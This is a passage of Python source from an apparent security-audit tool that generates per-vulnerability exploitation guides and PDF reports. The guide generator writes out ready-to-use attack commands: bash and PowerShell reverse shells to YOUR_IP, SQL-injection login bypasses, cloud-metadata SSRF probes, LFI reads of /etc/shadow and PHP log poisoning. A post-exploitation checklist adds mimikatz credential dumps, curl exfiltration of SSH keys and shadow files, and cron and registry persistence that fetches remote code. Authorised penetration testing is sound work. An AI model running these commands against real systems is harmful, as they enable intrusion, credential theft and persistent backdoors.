                    md.append("   # Open in Wireshark to inspect stolen cookie data")
                    md.append("   ```")

                elif 'Command Injection' in vtype or 'RCE' in vtype:
                    md.append("1. **Set up a reverse shell listener with ncat**:")
                    md.append("   ```bash")
                    md.append("   ncat -lnvp 4444")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Test for command injection with time-based payload**:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}; sleep 5\"")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Inject reverse shell**:")
                    md.append("   ```bash")
                    md.append(f"   # Linux target:")
                    md.append(f"   curl -s \"{url}; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\"")
                    md.append(f"   # Windows target:")
                    pwsh_cmd = "$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
                    md.append(f'   curl -s "{url}& powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{pwsh_cmd}"')
                    md.append("   ```")
                    md.append("")
                    md.append("4. **Capture the payload traffic with Wireshark**:")
                    md.append("   ```bash")
                    md.append(f"   sudo tcpdump -i eth0 -w rce_traffic.pcap host {target_domain}")
                    md.append("   ```")
                    md.append("")

                elif 'Authentication Bypass' in vtype:
                    md.append("1. **Try common bypass payloads with curl**:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}\" -d \"username=admin' OR '1'='1&password=admin' OR '1'='1\"")
                    md.append(f"   curl -s \"{url}\" -d \"username=admin&password=' OR '1'='1\"")
                    md.append(f"   curl -s \"{url}\" -d \"username=' OR 1=1-- -&password=\"")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Try default credentials**:")
                    md.append("   ```bash")
                    md.append(f"   # Common combinations:")
                    md.append("   for c in admin:admin admin:password root:root admin:123456; do")
                    md.append(f"     curl -s -o /dev/null -w \"%{{http_code}}\" -d \"username=$(echo $c | cut -d: -f1)&password=$(echo $c | cut -d: -f2)\" \"{url}\"")
                    md.append("     echo \" -> $c\"")
                    md.append("   done")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Burp Suite Intruder** with combined username/password wordlists")
                    md.append("")

                elif 'SSRF' in vtype:
                    md.append("1. **Test cloud metadata endpoints**:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}?url=http://169.254.169.254/latest/meta-data/\"")
                    md.append(f"   curl -s \"{url}?url=http://metadata.google.internal/computeMetadata/v1/\"")
                    md.append(f"   curl -s \"{url}?url=http://100.100.100.200/latest/meta-data/\"")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Port scan internal network via the SSRF**:")
                    md.append("   ```bash")
                    md.append(f"   for port in 22 80 443 3306 6379 9200 27017; do")
                    md.append(f"     curl -s -o /dev/null -w \"%{{http_code}}\" \"{url}?url=http://127.0.0.1:$port\"")
                    md.append("     echo \" -> port $port\"")
                    md.append("   done")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Capture the SSRF requests with Wireshark** to see where the server reaches:")
                    md.append("   ```bash")
                    md.append(f"   sudo tcpdump -i eth0 -w ssrf_traffic.pcap host {target_domain}")
                    md.append("   ```")
                    md.append("")

                elif 'File Inclusion' in vtype or 'LFI' in vtype or 'Path Traversal' in vtype:
                    md.append("1. **Read sensitive files via LFI**:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}../../../../etc/passwd\"")
                    md.append(f"   curl -s \"{url}../../../../etc/shadow\"")
                    md.append(f"   curl -s \"{url}../../../../proc/self/environ\"")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **PHP wrapper for source code disclosure** (if PHP detected):")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}php://filter/convert.base64-encode/resource=index.php\" | base64 -d")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Log poisoning for RCE (Apache/Nginx)**:")
                    md.append("   ```bash")
                    md.append(f"   # Inject PHP in User-Agent, then include the log file")
                    md.append("   curl -s -A '<?php system($_GET[\"cmd\"]); ?>' \"http://{target_domain}/\"")
                    md.append(f"   curl -s \"{url}../../../../var/log/apache2/access.log&cmd=id\"")
                    md.append("   ```")
                    md.append("")

                elif 'Directory Listing' in vtype:
                    md.append("1. **Browse the exposed directory** and download sensitive files:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}\"")
                    md.append(f"   wget -r -np -nH --cut-dirs=1 -R index.html \"{url}\"")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Look for specific sensitive files**:")
                    md.append("   ```bash")
                    md.append(f"   for f in .env .git/config config.php backup.sql wp-config.php dump.sql appsettings.json; do")
                    md.append(f'     curl -s -o /dev/null -w "%{{http_code}}" "{url}$f" && echo " -> $f"')
                    md.append("   done")
                    md.append("   ```")
                    md.append("")

                elif 'Missing Security Headers' in vtype:
                    md.append("1. **Check current security headers**:")
                    md.append("   ```bash")
                    md.append(f"   curl -sI \"{url}\" | grep -iE '^X-|^Content-Security|^Strict-Transport|^Referrer-Policy'")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Test clickjacking vulnerability**:")
                    md.append("   ```bash")
                    md.append(f"   # Create an HTML file with an iframe and open in browser:")
                    md.append("   echo '<html><body><iframe src=\"{url}\" width=500 height=500></iframe></body></html>' > clickjack_test.html")
                    md.append("   ```")
                    md.append("")

                else:
                    md.append("1. **Research CVEs** for this vulnerability type on MITRE/NVD:")
                    md.append("   ```bash")
                    md.append(f"   searchsploit {vtype}")
                    md.append(f"   curl -s \"https://cve.circl.lu/api/cve/search/{vtype.replace(' ', '%20')}\" | jq")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Manual verification**:")
                    md.append("   ```bash")
                    md.append(f"   curl -s -I \"{url}\"")
                    md.append(f"   curl -s \"{url}\" | head -100")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Capture traffic with Wireshark** for detailed analysis:")
                    md.append("   ```bash")
                    md.append(f"   sudo tcpdump -i eth0 -w vuln_capture.pcap host {target_domain}")
                    md.append("   ```")
                    md.append("")

        # ------------------------------------------------------------------
        # 7. Post-Exploitation
        # ------------------------------------------------------------------
        md.append("## 7. Post-Exploitation (If Access is Gained)")
        md.append("Once initial access is achieved, follow this checklist in order:")
        md.append("")

        md.append("### 7.1 Stabilise Your Shell")
        md.append("1. If you have a raw ncat shell, upgrade to a proper TTY:")
        md.append("   ```bash")
        md.append("   python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        md.append("   export TERM=xterm")
        md.append("   # Background with Ctrl+Z, then:")
        md.append("   stty raw -echo; fg")
        md.append("   ```")
        md.append("")
        md.append("2. If you lost your shell, set up a more reliable listener:")
        md.append("   ```bash")
        md.append("   # Listener with ncat that reconnects:")
        md.append("   while true; do ncat -lnvp 4444; done")
        md.append("   # Or use tmux/screen to keep it alive")
        md.append("   ```")
        md.append("")

        md.append("### 7.2 System Enumeration")
        md.append("1. **Identify user and privileges**:")
        md.append("   ```bash")
        md.append("   id && whoami")
        md.append("   sudo -l  # List sudo permissions")
        md.append("   cat /etc/passwd | grep -E '/bin/.*sh'")  
        md.append("   ```")
        md.append("")
        md.append("2. **Upload and run automated privilege escalation tools**:")
        md.append("   ```bash")
        md.append("   # Start HTTP server on attacker: python3 -m http.server 8080")
        md.append("   # On target (Linux):")
        md.append("   wget http://YOUR_IP:8080/LinPEAS.sh && chmod +x LinPEAS.sh && ./LinPEAS.sh")
        md.append("   # On target (Windows):")
        md.append("   certutil -urlcache -f http://YOUR_IP:8080/WinPEAS.exe WinPEAS.exe && WinPEAS.exe")
        md.append("   ```")
        md.append("")
        md.append("3. **Dump password hashes**:")
        md.append("   ```bash")
        md.append("   # Linux:")
        md.append("   cat /etc/shadow | grep -v ':\\*:' | grep -v ':!'")
        md.append("   # Windows (requires admin):")
        md.append("   mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit")
        md.append("   # Or use Impacket secretsdump remotely:")
        md.append("   impacket-secretsdump DOMAIN/USER:PASS@TARGET")
        md.append("   ```")
        md.append("")
        md.append("4. **Capture network traffic for lateral movement**:")
        md.append("   ```bash")
        md.append("   # On the compromised machine, capture local traffic with tcpdump:")
        md.append("   sudo tcpdump -i eth0 -w pivot_capture.pcap")
        md.append("   # Exfil the pcap to your attacker machine and open in Wireshark")
        md.append("   # Look for: SSH keys, FTP/smtp passwords, HTTP cookies, SMB shares")
        md.append("   ```")
        md.append("")

        md.append("### 7.3 Lateral Movement & Pivoting")
        md.append("1. **Enumerate internal network**:")
        md.append("   ```bash")
        md.append("   ip addr; ip route; cat /etc/hosts")
        md.append("   # Scan internal subnet:")
        md.append("   for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i &>/dev/null && echo \"10.0.0.$i is up\"; done")
        md.append("   # Quick port scan on discovered hosts using ncat:")
        md.append("   for port in 22 80 443 445 3306 3389 6379 8080; do echo | ncat -w 1 10.0.0.1 $port 2>&1; done")
        md.append("   ```")
        md.append("")
        md.append("2. **Pivot using chisel/proxychains**:")
        md.append("   ```bash")
        md.append("   # On attacker: ./chisel server -p 8000 --reverse")
        md.append("   # On target: ./chisel client ATTACKER_IP:8000 R:1080:socks")
        md.append("   # Then use proxychains: proxychains nmap -sT -sV 10.0.0.0/24")
        md.append("   ```")
        md.append("")
        md.append("3. **Extract SSH keys and private credentials**:")
        md.append("   ```bash")
        md.append("   find /home -name \"id_rsa\" -o -name \"id_ed25519\" 2>/dev/null")
        md.append("   find /root -name \"id_rsa\" -o -name \"id_ed25519\" 2>/dev/null")
        md.append("   # Use discovered keys: ssh -i id_rsa user@internal_host")
        md.append("   ```")
        md.append("")

        md.append("### 7.4 Data Exfiltration")
        md.append("1. **Stage data for exfiltration**:")
        md.append("   ```bash")
        md.append("   # Compress sensitive data:")
        md.append("   tar czf exfil.tar.gz /var/www/html /etc/shadow /etc/passwd ~/.ssh")
        md.append("   ```")
        md.append("")
        md.append("2. **Exfiltrate via various channels**:")
        md.append("   ```bash")
        md.append("   # HTTP exfil (start listener on attacker: nc -lnvp 8080 > received.tar.gz)")
        md.append("   curl --data-binary @exfil.tar.gz http://YOUR_IP:8080/")
        md.append("")
        md.append("   # DNS exfil (use dnscat2 on attacker:")
        md.append("   # Server: ruby dnscat2.rb --dns host=0.0.0.0,port=53")
        md.append("   # Client: ./dnscat2-client TARGET_IP")
        md.append("   ```")
        md.append("")
        md.append("3. **Monitor exfil traffic with Wireshark**:")
        md.append("   ```bash")
        md.append("   # On attacker machine, capture incoming data:")
        md.append("   sudo tcpdump -i eth0 -w exfil_capture.pcap port 8080")
        md.append("   # Verify data integrity: sha256sum received.tar.gz")
        md.append("   ```")
        md.append("")

        md.append("### 7.5 Persistence (Red Team Only)")
        md.append("1. **Linux persistence via cron + SSH keys**:")
        md.append("   ```bash")
        md.append("   # Add SSH key:")
        md.append("   echo \"ATTACKER_PUB_KEY\" >> ~/.ssh/authorized_keys")
        md.append("   # Cron reverse shell:")
        md.append("   (crontab -l 2>/dev/null; echo '*/5 * * * * bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"') | crontab -")
        md.append("   ```")
        md.append("")
        md.append("2. **Windows persistence**:")
        md.append("   ```bash")
        md.append("   # Scheduled task:")
        md.append('   schtasks /create /tn \"Updater\" /tr \"powershell -c iex(iwr http://YOUR_IP/ps1)\" /sc minute /mo 5')
        md.append("   # Registry run key:")
        md.append('   reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"powershell -c iex(iwr http://YOUR_IP/ps1)\"')
        md.append("   ```")
        md.append("")

        return "\n".join(md)

    def export_to_json(self, results: Dict[str, Any], filename: str) -> None:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, default=str)

    def generate_pdf_report(self, results: Dict[str, Any], filename: str) -> bool:
        """Generate a PDF report from scan results using reportlab."""
        try:
            from reportlab.lib.pagesizes import A4
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.units import inch, mm
            from reportlab.lib.colors import HexColor, black, red, orange, yellow, green
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
            from reportlab.lib import colors

            doc = SimpleDocTemplate(filename, pagesize=A4, topMargin=20*mm, bottomMargin=20*mm)
            styles = getSampleStyleSheet()
            story = []

            title_style = ParagraphStyle('CustomTitle', parent=styles['Title'], fontSize=24, spaceAfter=12)
            heading1 = ParagraphStyle('H1', parent=styles['Heading1'], fontSize=16, spaceBefore=12, spaceAfter=6)
            heading2 = ParagraphStyle('H2', parent=styles['Heading2'], fontSize=12, spaceBefore=8, spaceAfter=4)

            story.append(Paragraph("Athena Security Audit Report", title_style))
            story.append(Paragraph(f"Target: {results.get('target', 'Unknown')}", styles['Normal']))
            story.append(Paragraph(f"Date: {results.get('timestamp', datetime.now().isoformat())}", styles['Normal']))
            story.append(Spacer(1, 12))

            audit = results.get('athena_security_audit', results)
            summary = audit.get('audit_summary', {})
            story.append(Paragraph("Executive Summary", heading1))
            exec_summary = audit.get('executive_summary', {})
            story.append(Paragraph(f"Overview: {exec_summary.get('overview', 'No overview')}", styles['Normal']))
            story.append(Paragraph(f"Risk Rating: {summary.get('risk_rating', 'N/A')}", styles['Normal']))

            sev = summary.get('severity_breakdown', {})
            sev_data = [['Severity', 'Count']]
            sev_data.append(['Critical', str(sev.get('critical', 0))])
            sev_data.append(['High', str(sev.get('high', 0))])
            sev_data.append(['Medium', str(sev.get('medium', 0))])
            if sev.get('low'):
                sev_data.append(['Low', str(sev.get('low', 0))])
            sev_table = Table(sev_data, colWidths=[3*inch, 2*inch])
            sev_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (0, 1), HexColor('#ff4444')),
                ('BACKGROUND', (0, 2), (0, 2), HexColor('#ff8800')),
                ('BACKGROUND', (0, 3), (0, 3), HexColor('#ffbb33')),
            ]))
            story.append(sev_table)
            story.append(Spacer(1, 12))

            vulns = audit.get('detailed_analysis', {})
            if vulns:
                story.append(Paragraph("Vulnerability Details", heading1))
                for vtype, vinfo in vulns.items():
                    story.append(Paragraph(f"{vtype} ({vinfo.get('severity', 'N/A')})", heading2))
                    story.append(Paragraph(f"Description: {vinfo.get('description', '')}", styles['Normal']))
                    assets = vinfo.get('assets_affected', [])
                    if assets:
                        story.append(Paragraph(f"Affected assets: {', '.join(assets[:5])}", styles['Normal']))
                    story.append(Paragraph("How an attacker compromises this:", styles['Normal']))
                    for i, tech in enumerate(vinfo.get('attack_techniques', []), 1):
                        story.append(Paragraph(f"{i}. {tech}", styles['Normal']))
                    if vinfo.get('attacker_gains'):
                        story.append(Paragraph(f"Attacker gains: {vinfo['attacker_gains']}", styles['Normal']))
                    if vinfo.get('tools'):
                        story.append(Paragraph(f"Tools: {', '.join(vinfo['tools'])}", styles['Normal']))
                    story.append(Spacer(1, 6))

            recs = audit.get('remediation_recommendations', [])
            if recs:
                story.append(Paragraph("Remediation Recommendations", heading1))
                rec_data = [['Issue', 'Severity', 'Timeline']]
                for r in recs:
                    rec_data.append([r.get('issue', ''), r.get('severity', ''), r.get('timeline', '')])
                rec_table = Table(rec_data, colWidths=[2.5*inch, 1.5*inch, 1.5*inch])
                rec_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, -1), 9),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
                ]))
                story.append(rec_table)

            doc.build(story)
            return True
        except ImportError:
            self.logger.warning("reportlab not installed. Install with: pip install reportlab")
            return False
        except Exception as e:
            self.logger.error("PDF generation failed: %s", e)
            return False